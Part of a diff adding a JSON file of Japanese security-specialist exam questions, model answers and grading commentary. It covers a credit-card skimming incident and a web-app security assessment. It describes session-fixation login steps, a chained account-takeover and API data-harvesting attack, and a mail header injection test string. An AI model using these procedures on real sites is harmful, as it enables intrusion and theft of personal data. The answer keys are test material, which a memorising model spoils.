さんは，プロキシサーバなどのキャッシュの影響も考慮した上で，被害者候補を特定し，その情報を基に案内を出した。また，J 社は，関係当局に報告，届出を行うとともに，V 社と協力して再発防止策を検討し，実施した。さらに，Web サーバのファイルの改ざん検知の検討を行うことにした。</p>\n",
+   "items": [
+    {
+     "id": "1-a",
+     "label": "設問1 a",
+     "prompt": "本文中の <span class=\"blank\">a</span> 〜 <span class=\"blank\">e</span> に入れる適切な行番号又は字句を答えよ。",
+     "answers": [
+      "5"
+     ]
+    },
+    {
+     "id": "1-b",
+     "label": "設問1 b",
+     "prompt": "本文中の <span class=\"blank\">a</span> 〜 <span class=\"blank\">e</span> に入れる適切な行番号又は字句を答えよ。",
+     "answers": [
+      "クロスサイトスクリプティング"
+     ]
+    },
+    {
+     "id": "1-c",
+     "label": "設問1 c",
+     "prompt": "本文中の <span class=\"blank\">a</span> 〜 <span class=\"blank\">e</span> に入れる適切な行番号又は字句を答えよ。",
+     "answers": [
+      "格納"
+     ]
+    },
+    {
+     "id": "1-d",
+     "label": "設問1 d",
+     "prompt": "本文中の <span class=\"blank\">a</span> 〜 <span class=\"blank\">e</span> に入れる適切な行番号又は字句を答えよ。",
+     "answers": [
+      "2"
+     ]
+    },
+    {
+     "id": "1-e",
+     "label": "設問1 e",
+     "prompt": "本文中の <span class=\"blank\">a</span> 〜 <span class=\"blank\">e</span> に入れる適切な行番号又は字句を答えよ。",
+     "answers": [
+      "SQL インジェクション"
+     ]
+    },
+    {
+     "id": "2-1",
+     "label": "設問2 (1)",
+     "prompt": "〔偽フォーム表示の原因の調査と対策〕について。本文中の下線①について，書換え後の画面全体を図示せよ。（言葉で説明してから解答例と比べる）",
+     "answers": [
+      "画面タイトル“配送先・支払方法選択”，配送先のプルダウン，“お支払方法”の見出しはそのまま。ラジオボタン（クレジットカード決済・銀行振込）が消え，代わりに“カード番号”，“有効期限 □月/□年”，“名義”，“セキュリティコード”の入力欄が表示される。下に“戻る”“次へ”ボタン。"
+     ],
+     "note": "IPA の解答例は画面の図。ラジオボタンが残っている，余計な改ざんがある，といった過不足は誤り（採点講評）"
+    },
+    {
+     "id": "2-2",
+     "label": "設問2 (2)",
+     "prompt": "本文中の下線②について，パラメータ名とその値を答えよ。",
+     "answers": [
+      "パラメータ名：order[Payment]／値：1"
+     ]
+    },
+    {
+     "id": "2-3",
+     "label": "設問2 (3)",
+     "prompt": "図 2 について，4〜15 行目の処理内容を具体的に答えよ。",
+     "answers": [
+      "addEventListener メソッドで配送先・支払方法選択画面の form 要素にイベントリスナーを登録し，submit 時にクレジットカード情報をクエリパラメータとして i-sha.com に送信する。"
+     ]
+    },
+    {
+     "id": "3-1",
+     "label": "設問3 (1)",
+     "prompt": "〔クレジットカード情報の漏えいの調査と対策〕について。本文中の下線③について，攻撃者の Web サーバでクレジットカード情報を取得する方法を答えよ。",
+     "answers": [
+      "Web サーバのアクセスログのリクエスト URI から情報を取得する。"
+     ]
+    },
+    {
+     "id": "3-2",
+     "label": "設問3 (2) f",
+     "prompt": "本文中の <span class=\"blank\">f</span> に入れる適切な字句を答えよ。",
+     "answers": [
+      "配送先・支払方法選択画面にアクセスしたアカウント名"
+     ]
+    }
+   ],
+   "commentary": "問 3 では，EC サイトのクレジットカード情報の漏えいを題材に，Web サイトの改ざん手法と影響を受けた利用者の調査について出題した。全体として正答率は平均的であった。\n設問１c は，正答率がやや低かった。クロスサイトスクリプティング（XSS）脆弱性は反射型，格納型，DOMベースの 3 種類あるが，ログから攻撃を分析するためにもそれらの違いを理解してほしい。\n設問 2(1)は，正答率がやや低かった。書換え対象のラジオボタンの選択肢が残っていたり，余計な改ざんがされていたりといった改ざん内容に過不足のある解答が散見された。HTML，DOM の仕組みを利用した画面の書換えは攻撃で悪用される可能性があるので，よく理解してほしい。\n設問 3(1)は，正答率が平均的であった。通信を盗聴する，キーロガーを仕掛けるといった解答が散見された。クレジットカード情報がクエリパラメータとして送られ，かつ Web サーバのアクセスログにリクエスト URI が記録されることを理解した上で解答してほしい。"
+  },
+  {
+   "no": 4,
+   "title": "セキュリティ診断",
+   "pages": "p.30〜39",
+   "aim": "脆弱性は一つ一つが軽微でも，複数組み合わせて悪用されると，重大な被害につながることがある。また，診断ツールで検出される脆弱性以外にも，想定される攻撃に対して，セキュリティ対策が不足しているといった脆弱性もある。診断者がこういった脆弱性も報告に含めることで，その後，システムのセキュリティが大きく向上することがある。本問では，個人情報を取り扱う Web サイトに対するセキュリティ診断を題材に，診断ツールで検出された脆弱性について，悪用された場合の被害を想定する能力及び被害を低減するための対策を立案する能力を問う。",
+   "body": "\n<p>B 社は，セキュリティ診断サービスを提供している会社である。このたび，転職支援サービスを提供している M 社から，転職支援 Web サイト（以下，M サイトという）のセキュリティ診断を受注した。</p>\n<p>M サイトを利用する求職者は，氏名，自宅住所，電話番号，勤務先などの求職者属性情報と，希望職種，希望条件などの求職情報を入力する。求人企業は，会社情報，求人情報，求人担当者の氏名，所属部署などの情報を入力する。これらの情報は，M サイトのデータベースに保存される。M サイトでは，入力された情報に基づいて，求職者と求人企業のマッチングを行っている。求職者は，マッチングで提案された企業に問合せや応募をすることができる。</p>\n<p>M サイトは，機能を追加した新しいバージョンの Web アプリケーションプログラム（以下，M サイトの Web アプリケーションプログラムを Web アプリという）と，求人企業がアプリケーションプログラムから HTTPS で呼び出すことを想定したインタフェース（以下，このインタフェースを WebAPI という）の開発が完了したところであり，リリース前である。</p>\n<h3>〔セキュリティ診断の診断対象と診断方法〕</h3>\n<p>今回のセキュリティ診断の診断対象と診断方法は，図 1 のとおりである。</p>\n<div class=\"fig\"><div class=\"fig-box\">【診断対象】<br>\n・M サイトには本番用サイトと検証用サイトがあり，診断対象は M サイトの検証用サイトとする。検証用サイトには，開発が完了した新しいバージョンの Web アプリが導入されている。なお，本番用サイトと検証用サイトは，同一の構成である。<br>\n・検証用サイトでは，アクセス元の IP アドレスを制限している。診断に当たり，B 社からも検証用サイトにアクセスできるように，検証用サイトの設定を変更する。<br>\n・検証用サイトには，テスト用疑似データが投入されている。<br><br>\n【診断方法】<br>\n・B 社の社内にある診断用 PC からインターネットを経由して診断を行う。<br>\n・Web アプリの脆弱性の検出と，Web サーバのプラットフォームの脆弱性の検出を行う。<br>\n・Web アプリの脆弱性の検出は，診断ツールと診断員の手作業で行う。<br>\n・Web サーバのプラットフォームの脆弱性の検出は，診断ツールで行う。<br>\n・診断に当たり，必要に応じて M サイトの設計書を参照する。</div><p class=\"fig-caption\">図1　診断対象と診断方法</p></div>\n<p>M サイトの設計書の中で参照した部分を，図 2，図 3 及び表 1 に示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">1. プロトコルは，HTTPS とする。<br>\n2. RESTful API によって，次の機能を求人企業に提供する。<br>\n　(1) 日時の範囲を指定して，当該企業宛てに問合せがあった求職者の求職者 ID<sup>1)</sup>を取得する。<br>\n　(2) 日時の範囲を指定して，当該企業宛てに応募があった求職者の求職者 ID を取得する。<br>\n　(3) 任意の求職者 ID を指定して，求職者属性情報を取得する。<br>\n3. 求人企業の認証方式は次のとおりとする。<br>\n　(1) WebAPI を利用する際の利用者認証のために，M サイトの利用者 ID<sup>2)</sup>と紐付けられた APIkey を発行する。APIkey の有効期間は，発行後 14 日間とする。<br>\n　(2) WebAPI を利用する際の HTTP Request 内の APIkey が，発行済みのものであり，かつ，有効期間内であるか確認することで，正規利用者であるかどうかを確認する。<br>\n4. APIkey については，次のとおりとする。<br>\n　(1) 求人企業のうち，WebAPI の利用契約を締結済みの企業だけに APIkey を発行する。利用契約で認めている求職者属性情報の利用範囲は，当該企業への問合せ又は当該企業への応募それぞれに関する対応だけである。<br>\n　(2) 一つの利用者 ID に対して複数の APIkey を発行できる。<br>\n　(3) 求職者には，APIkey を発行しない。</div><p class=\"fig-note\">注 1)　求職者が M サイトに利用者登録をした年月日の 8 桁の数字の後ろに，日ごとに 000001 から登録順に割り当てられる 6 桁の数字を加えた数字 14 桁の文字列である。<br>注 2)　M サイトを利用する求職者及び求人企業の担当者ごとに発行される。</p><p class=\"fig-caption\">図2　WebAPI の仕様</p></div>\n<div class=\"fig\"><img src=\"data/img/r06a_pm4_fig3a.png\" alt=\"画面01ログイン〜13PW変更完了の画面遷移図。01ログイン→(イ)02求人企業トップ→(エ)03求人企業マイページ。01からPW再設定(ウ)で14へ、ログイン失敗(ア)で01へ。03からAPIkey管理(オ)04、プロパティ変更(カ)09、PW変更(キ)12。04からAPIkey確認(ク)05PW再確認(1)→(コ)06APIkey一覧→(サ)03、APIkey発行(ケ)07PW再確認(2)→(シ)08APIkey発行→(ス)03。09求人企業プロパティ変更→メール(あ)送信と(セ)10メール送信完了(1)、または(ソ)11プロパティ変更完了→(タ)03。12PW変更→(チ)13PW変更完了→(ツ)03。実線はCSRF対策なし、破線はCSRF対策あり。(コ)(シ)(セ)(ソ)(チ)は破線、(ア)(イ)(ウ)(エ)(オ)(カ)(キ)(ク)(ケ)(サ)(ス)(タ)(ツ)は実線。\" loading=\"lazy\"><p class=\"fig-caption\">図3　画面遷移図（抜粋）</p></div>\n<div class=\"fig\"><img src=\"data/img/r06a_pm4_fig3b.png\" alt=\"14PW再設定(1)：利用者ID入力、メール送信→メール(い)送信と(テ)15メール送信完了(2)。16PW再設定(2)：新PW入力→(ト)17PW再設定完了→(ナ)01へ。(テ)(ト)は破線、(ナ)は実線。\" loading=\"lazy\"><p class=\"fig-caption\">図3　画面遷移図（抜粋）（続き）</p></div>\n<p class=\"fig-note\">注記1　ログインしていない状態で，02〜13 の画面にアクセスした場合，エラー画面が表示される。<br>\n注記2　設問に関係しない画面，ボタン及び画面遷移は省略している。<br>\n注 1)　画面 09 でメールアドレスを変更した場合の画面遷移である。画面遷移の際，M サイトから，変更前のメールアドレスに，確認用 URL が記載されたメール(あ)を送信する。利用者がメール(あ)に記載された確認用 URL にアクセスすると，変更を反映し，画面 11 を表示するとともに，M サイトから，変更前及び変更後のメールアドレスに，変更内容が記載されたメールを送信する。<br>\n注 2)　画面 09 でメールアドレス以外だけを変更した場合の画面遷移である。<br>\n注 3)　画面遷移の際，M サイトから，登録しているメールアドレスに，PW 再設定用 URL が記載されたメール(い)を送信する。利用者がメール(い)に記載された PW 再設定用 URL にアクセスすると，画面 16 を表示する。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>画面番号</th><th>URL</th></tr></thead><tbody><tr><td>01，02</td><td>https://test.△△△.jp/</td></tr><tr><td>03</td><td>https://test.△△△.jp/mypage</td></tr><tr><td>04</td><td>https://test.△△△.jp/apikey</td></tr><tr><td>05，06</td><td>https://test.△△△.jp/keylist</td></tr><tr><td>07，08</td><td>https://test.△△△.jp/keynew</td></tr><tr><td>09，10，11</td><td>https://test.△△△.jp/property</td></tr><tr><td>12，13</td><td>https://test.△△△.jp/pwchange</td></tr><tr><td>14，15</td><td>https://test.△△△.jp/pwreset</td></tr><tr><td>16，17</td><td>https://test.△△△.jp/pwreset/x<sup>1)</sup></td></tr></tbody></table></div><p class=\"fig-caption\">表1　各画面の URL</p></div>\n<p class=\"fig-note\">注 1)　x は，PW 再設定を行う都度生成されるランダムな英数字 32 字の文字列である。</p>\n<h3>〔セキュリティ診断報告書〕</h3>\n<p>B 社は，セキュリティ診断を実施し，図 4 の診断報告書を作成した。</p>\n<div class=\"fig\"><div class=\"fig-box\"><p class=\"center\"><b>診断報告書</b></p>\n<p><b>1 章　診断結果概要</b><br>1.1 診断結果要約<br>M サイトで，脆弱性を検出した。<br>（省略）<br>1.2 検出した脆弱性の件数<br>（省略）</p>\n<p><b>2 章　Web アプリケーションプログラムの診断結果</b><br>2.1 検出した脆弱性の概要<br>検出した脆弱性は，表 A のとおりである。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>重要度</th><th>脆弱性の種類</th><th>検出箇所</th></tr></thead><tbody><tr><td>1</td><td>（省略）</td><td>セッションフィクセーション</td><td>画面遷移 <span class=\"blank\">a</span></td></tr><tr><td>2</td><td>（省略）</td><td>メールヘッダーインジェクション</td><td>メール(あ)の送信</td></tr><tr><td>3</td><td>（省略）</td><td>HTTP ヘッダーの不備</td><td>全ての画面遷移</td></tr></tbody></table></div><p class=\"fig-caption\">表A　検出した Web アプリケーションプログラムの脆弱性の一覧</p></div>\n<p>2.2 検出した脆弱性の説明<br>2.2.1 セッションフィクセーション<br>(1) 脆弱性の内容<br>M サイトでは form 内の hidden フィールドである sessionID の値だけでセッション管理を実施していた。しかし，表 B のいずれの画面遷移においても，HTTP レスポンス中の sessionID の値が同一であった。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>画面遷移</th><th>HTTP レスポンス中の sessionID</th></tr></thead><tbody><tr><td>Web ブラウザに直接 URL を入力して，画面 01 を表示したとき</td><td>&lt;input type=\"hidden\" id=\"sessionID\" name=\"sessionID\" value=\"764b2ac2-0452-49e4-92a7-0914fa005011\"&gt;</td></tr><tr><td>画面遷移(ア)</td><td>&lt;input type=\"hidden\" id=\"sessionID\" name=\"sessionID\" value=\"764b2ac2-0452-49e4-92a7-0914fa005011\"&gt;</td></tr><tr><td>画面遷移(イ)</td><td>&lt;input type=\"hidden\" id=\"sessionID\" name=\"sessionID\" value=\"764b2ac2-0452-49e4-92a7-0914fa005011\"&gt;</td></tr><tr><td>画面遷移(エ)</td><td>&lt;input type=\"hidden\" id=\"sessionID\" name=\"sessionID\" value=\"764b2ac2-0452-49e4-92a7-0914fa005011\"&gt;</td></tr></tbody></table></div><p class=\"fig-caption\">表B　セッションフィクセーション脆弱性の確認</p></div>\n<p>攻撃者が図 A の手順でこの脆弱性を悪用すると，M サイトに不正にログインすることができる。</p>\n<div class=\"fig\"><div class=\"fig-box\">手順 1：求人企業の登録メールアドレスを，何らかの方法で入手する。<br>\n手順 2：URL “<span class=\"blank\">b</span>” にアクセスして，sessionID を入手する。<br>\n手順 3：次の二つの要素を含む HTML を作成する。<br>\n　－ 手順 2 で入手した sessionID を記述したフォーム<br>\n　－ 当該 HTML が Web ブラウザに読み込まれた直後に，上記のフォームを URL “<span class=\"blank\">b</span>” に POST メソッドで送信するスクリプト<br>\n手順 4：手順 3 で作成した HTML を，罠サイトに置く。<br>\n手順 5：手順 4 の HTML へのリンクを含むメールを作成し，手順 1 で入手したメールアドレスに送信する。<br>\n手順 6：手順 5 のメールがメール受信者に届き，罠サイトにアクセスするのを待つ。<br>\n手順 7：罠サイトへのアクセスを検知後，<span class=\"blank\">c</span> が完了することを期待して数分間待ち，手順 2 で入手した sessionID を指定した状態で，URL “<span class=\"blank\">b</span>” にアクセスする。</div><p class=\"fig-caption\">図A　セッションフィクセーション脆弱性を悪用して不正ログインする手順</p></div>\n<p>攻撃者が，セッションフィクセーション脆弱性を悪用して不正ログインに成功し，画面 02 で応募者確認ボタンをクリックして，当該企業の求人に応募した求職者の求職者属性情報と求職情報を閲覧できる。また，同じ画面 02 で問合せ確認ボタンをクリックして，当該企業に問合せを行った求職者の求職者属性情報と問合せ内容を閲覧できる。</p>\n<p>(2) 脆弱性の修正方法<br><span class=\"blank\">a</span> の画面遷移の際に実行されるコードにおいて，<span class=\"blank\">d</span> することを推奨する。</p>\n<p>2.2.2 メールヘッダーインジェクション<br>この脆弱性は，メール(あ)について検出された。なお，メール(い)では，この脆弱性は検出されなかった。<br>(1) 脆弱性の内容<br>図 B の手順で操作を行ったところ，メール(あ)が abc@example.com だけに送信され，本来の宛先である変更前のメールアドレスには送信されなかった。abc@example.com に送信されたメール(あ)の内容を表 C に示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">手順 1：画面 09 の会社名に図 C の検査文字列を入力して変更ボタンをクリックする。<br>\n手順 2：画面 11 で OK ボタンをクリックする。<br>\n手順 3：画面 03 でプロパティ変更ボタンをクリックして，再度，画面 09 を表示する。<br>\n手順 4：画面 09 でメールアドレスに xyz@example.com を入力して変更ボタンをクリックする。</div><p class=\"fig-caption\">図B　メールヘッダーインジェクション脆弱性を検出した手順</p></div>\n<div class=\"fig\"><pre class=\"fig-code\">●●株式会社%0D%0ATo:abc@example.com%0D%0A%0D%0A</pre><p class=\"fig-caption\">図C　メールヘッダーインジェクションの検査文字列</p></div>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>位置</th><th>内容</th></tr></thead><tbody><tr><td>メール(あ)のヘッダー部の末尾</td><td>Subject: ●●株式会社<br>To:abc@example.com</td></tr><tr><td>メール(あ)のボディ部の冒頭</td><td>様のメールアドレス変更のお知らせ<br>To: &lt;本来の宛先&gt;<sup>1)</sup></td></tr></tbody></table></div><p class=\"fig-caption\">表C　メール(あ)の内容</p></div>\n<p class=\"fig-note\">注 1)　&lt;本来の宛先&gt;には，変更前のメールアドレスが入っていた。</p>\n<p>攻撃者がこの脆弱性を悪用するには，求人企業として M サイトにログインする必要がある。求人企業としての登録には審査が必要であり，この脆弱性だけを利用して攻撃が行われるおそれは小さい。<br>(2) 脆弱性の修正方法<br>（省略）</p>\n<p>2.2.3 HTTP ヘッダーの不備<br>(1) 脆弱性の内容<br>表 D の HTTP ヘッダーは，出力するよう推奨されているが，いずれの画面遷移の HTTP レスポンスにおいても出力されなかった。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>HTTP ヘッダー名</th><th>設定した場合の主な効果</th></tr></thead><tbody><tr><td>Content-Security-Policy</td><td>Web ブラウザが実行可能なスクリプトの有効なソースとなるドメインを，M サイトで必要なものだけに限定することができる。</td></tr><tr><td>Strict-Transport-Security</td><td><span class=\"blank\">e</span></td></tr><tr><td>X-Content-Type-Options</td><td><span class=\"blank\">f</span></td></tr></tbody></table></div><p class=\"fig-caption\">表D　出力されなかった HTTP ヘッダー</p></div>\n<p>これらの HTTP ヘッダーを設定することで他の脆弱性による被害を軽減することができる。<br>(2) 脆弱性の修正方法<br>（省略）</p>\n<p><b>3 章　プラットフォームの診断結果</b><br>3.1 検出した脆弱性の概要<br>検出した脆弱性は，表 E のとおりである。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>重要度</th><th>脆弱性の種類</th></tr></thead><tbody><tr><td>1</td><td>（省略）</td><td>TLS 1.1 が利用可能</td></tr><tr><td>2</td><td>（省略）</td><td>HTTP サーバのバージョンの露出</td></tr></tbody></table></div><p class=\"fig-caption\">表E　検出したプラットフォームの脆弱性の一覧</p></div>\n<p>3.2 検出した脆弱性の説明<br>3.2.1 TLS 1.1 が利用可能<br>（省略）<br>3.2.2 HTTP サーバのバージョンの露出<br>HTTP レスポンスのヘッダーに，HTTP サーバのバージョンが出力されている。<br>（省略）</p>\n<p><b>4 章　総合評価</b><br>4.1 想定される攻撃と被害<br>攻撃者が，セッションフィクセーション脆弱性を悪用するだけでも求職者属性情報を窃取することができるが，図 D の順序で攻撃をした場合，不審なメールが求人企業に届かないので，攻撃に気付かれることなく，WebAPI を悪用して，より多くの求職者属性情報を窃取することができる。</p>\n<div class=\"fig\"><div class=\"fig-box\">(1) 図 A の手順で，M サイトに不正にログインする。ただし，図 A の手順 1 で入手するメールアドレスは，WebAPI の利用権限をもつ求人企業のものである。<br>\n(2) <span class=\"blank\">g</span><br>\n(3) 画面 09 で，メールアドレスに攻撃者のメールアドレスを入力して，変更ボタンをクリックする。<br>\n(4) 別の端末から，画面 01 で PW 再設定ボタンをクリックし，(1)で不正にログインした利用者 ID に対する一連のパスワード再設定処理を行う。<br>\n(5) 再設定後のパスワードでログインする。<br>\n(6) <span class=\"blank\">h</span><br>\n(7) WebAPI の機能を利用して，多数の求職者属性情報を窃取する。</div><p class=\"fig-caption\">図D　より多くの求職者属性情報の窃取につながる攻撃</p></div>\n<p>（省略）</p>\n<p><b>5 章　参考意見</b><br>本章は，弊社の知見に基づく参考意見である。<br>5.1 M サイトの仕様についての意見<br>今回の診断の過程で，M サイトの仕様の一部を把握することができた。弊社が把握できた範囲内でも，M サイトの仕様には幾つかの問題点があり，表 A と表 E の脆弱性を修正したとしても，インターネットからの攻撃によって被害が発生するおそれがある。</p>\n<p>5.1.1 WebAPI の仕様の改善<br>WebAPI に関して，仕様の改善の方針案と改善すべき理由を表 F に示す。改善によって，攻撃による被害を未然に防止すること，又は被害を軽減することができる。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>仕様の改善の方針案</th><th>改善すべき理由</th></tr></thead><tbody><tr><td>1</td><td><span class=\"blank\">i</span></td><td><span class=\"blank\">j</span></td></tr><tr><td>⋮</td><td>⋮</td><td>⋮</td></tr></tbody></table></div><p class=\"fig-caption\">表F　WebAPI の仕様の改善の方針案</p></div>\n<p>5.1.2 Web アプリケーションプログラムの求職者向け機能の仕様の改善<br>（省略）</p>\n<p>5.1.3 Web アプリケーションプログラムの求人企業向け機能の仕様の改善<br>Web アプリケーションプログラムの求人企業向け機能に関して，仕様の改善の方針案と改善すべき理由を表 G に示す。改善によって，攻撃による被害を未然に防止すること，又は被害を軽減することができる。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>仕様の改善の方針案</th><th>改善すべき理由</th></tr></thead><tbody><tr><td>1</td><td><span class=\"blank\">k</span></td><td><span class=\"blank\">l</span></td></tr><tr><td>⋮</td><td>⋮</td><td>⋮</td></tr></tbody></table></div><p class=\"fig-caption\">表G　Web アプリケーションプログラムの求人企業向け機能の仕様の改善の方針案</p></div>\n<p>（省略）</p></div><p class=\"fig-caption\">図4　診断報告書</p></div>\n<p>B 社は，M 社に診断報告書を提出し，セキュリティ診断を完了した。</p>\n",
+   "items": [
+    {
+     "id": "1-a",
+     "label": "設問1 (1) a",
+     "prompt": "図 4 中の 2 章について。表 A 中及び 2.2.1(2)中の <span class=\"blank\">a</span> に入れる適切な記号を，図 3 中の画面遷移の記号(ア)〜(ナ)から選び，答えよ。",
+     "answers": [
+      "(イ)"
+     ]
+    },
+    {
+     "id": "1-b",
+     "label": "設問1 (2) b",
+     "prompt": "図 A 中の <span class=\"blank\">b</span> に入れる適切な URL を，表 1 から選び答えよ。",
+     "answers": [
+      "https://test.△△△.jp/"
+     ]
+    },
+    {
+     "id": "1-c",
+     "label": "設問1 (3) c",
+     "prompt": "図 A 中の <span class=\"blank\">c</span> に入れる適切な操作を答えよ。",
+     "answers": [
+      "メール受信者によるログイン"
+     ]
+    },
+    {
+     "id": "1-d",
+     "label": "設問1 (4) d",
+     "prompt": "2.2.1(2) 中の <span class=\"blank\">d</span> に入れる適切な修正方法を具体的に答えよ。",
+     "answers": [
+      "使用済みの sessionID を無効にした上で，新しい sessionID を発行"
+     ]
+    },
+    {
+     "id": "1-e",
+     "label": "設問1 (5) e",
+     "prompt": "表 D 中の <span class=\"blank\">e</span> に入れる適切な効果を答えよ。（Strict-Transport-Security）",
+     "answers": [
+      "M サイトへの接続を HTTPS に強制することができる。"
+     ]
+    },
+    {
+     "id": "1-f",
+     "label": "設問1 (5) f",
+     "prompt": "表 D 中の <span class=\"blank\">f</span> に入れる適切な効果を答えよ。（X-Content-Type-Options）",
+     "answers": [
+      "M サイトのコンテンツに対して，Content-Type ヘッダーで指定した MIME タイプを強制的に適用することができる。"
+     ]
+    },
+    {
+     "id": "2-g",
+     "label": "設問2 g",
+     "prompt": "図 4 中の 4 章にある図 D 中の <span class=\"blank\">g</span> に入れる攻撃手順を答えよ。",
+     "answers": [
+      "画面 09 で，会社名に，図 C の abc@example.com を攻撃者のメールアドレスに変更した文字列を入力して変更ボタンをクリックする。"
+     ]
+    },
+    {
+     "id": "2-h",
+     "label": "設問2 h",
+     "prompt": "図 4 中の 4 章にある図 D 中の <span class=\"blank\">h</span> に入れる攻撃手順を答えよ。",
+     "answers": [
+      "画面 04 からの一連の操作において，画面 05 又は画面 07 で再設定後のパスワードを入力して，WebAPI キーを確認又は発行する。"
+     ]
+    },
+    {
+     "id": "3-ij",
+     "label": "設問3 i・j",
+     "prompt": "あなたがこの診断を担当したとして，図 4 中の 5 章の表 F 中の <span class=\"blank\">i</span>，<span class=\"blank\">j</span> 及び表 G 中の <span class=\"blank\">k</span>，<span class=\"blank\">l</span> に記述する内容を答えよ。なお，複数の改善の方針案がある場合は，被害を防ぐ効果が最も高いものを答えよ。（表F：WebAPI の仕様の改善の方針案 i と改善すべき理由 j）",
+     "answers": [
+      "i：求職者 ID が推測困難なものになるように，求職者 ID の生成方法を変更する。／ j：APIkey が窃取された場合，当該求人企業への問合せ又は応募をした求職者の情報漏えいだけに被害を軽減することができるから",
+      "i：WebAPI のアクセス元 IP アドレスを限定して接続を許可するように変更する。／ j：WebAPI への第三者による不正なアクセスを防ぐことができるから",
+      "i：WebAPI で取得できる求職者属性情報は，個人を特定できないものだけに限定するように変更する。／ j：不正に WebAPI が利用されても，個人を特定できない情報の漏えいだけに被害を軽減することができるから"
+     ],
+     "note": "これらに限らず，WebAPI に関する被害を軽減する仕様の改善方針案が記述されていること（解答例の備考）"
+    },
+    {
+     "id": "3-kl",
+     "label": "設問3 k・l",
+     "prompt": "あなたがこの診断を担当したとして，図 4 中の 5 章の表 F 中の <span class=\"blank\">i</span>，<span class=\"blank\">j</span> 及び表 G 中の <span class=\"blank\">k</span>，<span class=\"blank\">l</span> に記述する内容を答えよ。なお，複数の改善の方針案がある場合は，被害を防ぐ効果が最も高いものを答えよ。（表G：求人企業向け機能の仕様の改善の方針案 k と改善すべき理由 l）",
+     "answers": [
+      "k：ログインの認証を，多要素認証に変更する。／ l：アカウントの乗っ取りを防ぐことができるから",
+      "k：利用者ごとにアクセス元 IP アドレスを限定して接続を許可するように変更する。／ l：第三者による不正なアクセスを防ぐことができるから",
+      "k：求人企業プロパティ変更において，メールアドレス以外を変更した場合でも，メールを送信するように変更する。／ l：不正に求人企業プロパティが変更された場合に気付くことができるから"
+     ],
+     "note": "これらに限らず，Web アプリケーションプログラムに関する被害を軽減する仕様の改善方針案が記述されていること（解答例の備考）"
+    }
+   ],
+   "commentary": "問 4 では，個人情報を取り扱う Web サイトに対するセキュリティ診断を題材に，診断ツールで検出された脆弱性について，悪用された場合の被害及び被害を低減するための対策について出題した。全体として正答率は平均的であった。\n設問 1(2)は，正答率が高かった。セッションフィクセーション脆弱性について，よく理解できていた。\n設問 1(5)f は，正答率が低かった。攻撃による被害を軽減する HTTP ヘッダーについて，設定した場合の効果をよく理解してほしい。\n設問 2g は，正答率が低かった。攻撃の後の流れに合っていない解答が散見された。Web サイトの全体の機能を考慮し，脆弱性を組み合わせて悪用する攻撃を考える能力を培ってほしい。\n設問 3 は，正答率がやや低かった。被害を軽減できない誤答が散見された。Web サイトでは，取り扱う情報の機密性などに応じた，認証やアクセス制限が必要である。それぞれの Web サイトの特性を考慮したセキュリティ対策を策定する能力を培ってほしい。"
+  }
+ ]
+}
